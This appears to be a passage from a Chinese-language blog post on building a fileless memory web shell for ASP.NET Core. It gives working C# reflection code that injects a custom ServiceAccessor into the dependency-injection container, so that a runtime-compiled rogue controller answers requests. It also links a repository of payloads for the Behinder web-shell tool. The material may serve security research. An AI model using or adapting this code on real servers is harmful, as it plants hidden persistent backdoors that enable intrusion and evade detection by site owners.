![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738573162307-f81cf250-8636-47f2-8292-c1c291eeef49.png)

参数一是通过服务类型获得在依赖注入容器的标识符`ServiceIdentifier.FromServiceType(serviceType)`。`ServiceProviderEngineScope`是依赖注入容器的一部分，负责管理服务在特定作用域（例如 HTTP 请求）内的实例化、生命周期和销毁。

主要流程是获取指定类型的`ServiceAccessor`，通过它在容器中动态的获取服务实例

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738573538903-88c2eb3b-5a51-41a3-96e4-6f76348e15d8.png)

+ `CallSite`：描述如何解析和实例化服务的元数据，列出了依赖项及其解析方式。
+ `RealizedService`：是`CallSite`解析后生成的具体服务实例，为容器实际提供的对象，是一个委托。

在应用启动阶段依赖注入框架会为Controller类自动创建`ServiceAccessor`。

在这种情况下，除了更新路由表外，还需要创建一个自定义`ServiceAccessor`并设置`RealizedService`属性返回自定义Controller实列。

```csharp
var requestServices = this.Context.RequestServices;
// 程序集中定义的Controller
Type controllerType =assemblyShell.DefinedTypes.FirstOrDefault(t => t.FullName.Contains("Controller"));
// 获取 ServiceIdentifier 类型
Type serviceIdentifierType = requestServices.GetType().Assembly.DefinedTypes.ToArray().FirstOrDefault(m => m.FullName.Equals("Microsoft.Extensions.DependencyInjection.ServiceLookup.ServiceIdentifier"));
var fromServiceTypeMethod = serviceIdentifierType.GetMethod("FromServiceType");
var rootProvider = requestServices.GetType().GetProperty("RootProvider", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(requestServices);
// ServicesAccessor 集合
var serviceAccessors = rootProvider.GetType().GetField("_serviceAccessors", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(rootProvider);
var tryAddMethod = serviceAccessors.GetType().GetMethod("TryAdd");
// new ServiceIdentifier
var _controllerServiceIdentifierType = fromServiceTypeMethod.Invoke(null, new object[] { controllerType });
Type serviceAccessorType = requestServices.GetType().Assembly.DefinedTypes.ToArray()
    .FirstOrDefault(m => m.FullName.Equals("Microsoft.Extensions.DependencyInjection.ServiceProvider"))
    .GetNestedTypes(BindingFlags.NonPublic).FirstOrDefault(m => m.FullName.Contains("ServiceProvider+ServiceAccessor"));
// 自定义 ServicesAccessor 返回服务实例的行为
Func<object?, object?> func = _ => Activator.CreateInstance(controllerType);;
// 创建自定义 ServicesAccessor
var serviceAccessor = Activator.CreateInstance(serviceAccessorType);
serviceAccessorType.GetProperty("RealizedService").SetValue(serviceAccessor, func);
// 添加自定义 ServicesAccessor
tryAddMethod.Invoke(serviceAccessors,  new object[]{_controllerServiceIdentifierType, serviceAccessor});

```

这个时候需要注意的是，内存马实现是通过动态编译创建程序集，所以需要注意其编译阶段需要的依赖，这里直接遍历环境中已加载程序集作为编译依赖，如果这个程序集不在环境中则需要指定，编译成功并添加到`ServicesAccessor`集合后，在访问指定的Controller时，会通过`RealizedService`获得实例；那么在自定义的`Action`中如何获得`HttpContext`呢，这需要这个Controller继承`ControllerBase`基类，这样虽然实例的创建没有使用依赖注入容器进行依赖注入，但是其基类`ControllerBase`本身有一个`HttpContext`属性，在执行`RequestDelegate`委托的时候，`Microsoft.AspNetCore.Mvc.Controllers.DefaultControllerPropertyActivator.GetActivatorDelegate`会创建一个委托用于为Controller的属性进行依赖注入。



效果如下：

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738585110933-1776077d-813a-43ec-bf7d-5622d3f04b67.png)

删除`/Views/Home/_ViewStart.cshtml`

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738585179903-9a1fe08a-c3eb-4cfc-ba45-e40c0b983226.png)

![](https://cdn.nlark.com/yuque/0/2025/png/33593053/1738585216039-a6142727-caa4-4ca4-b147-810782d0eaac.png)





完整代码片段：[https://github.com/orzchen/Behinder-dotnet-Core-Payload/tree/main/MemShell](https://github.com/orzchen/Behinder-dotnet-Core-Payload/tree/main/MemShell)

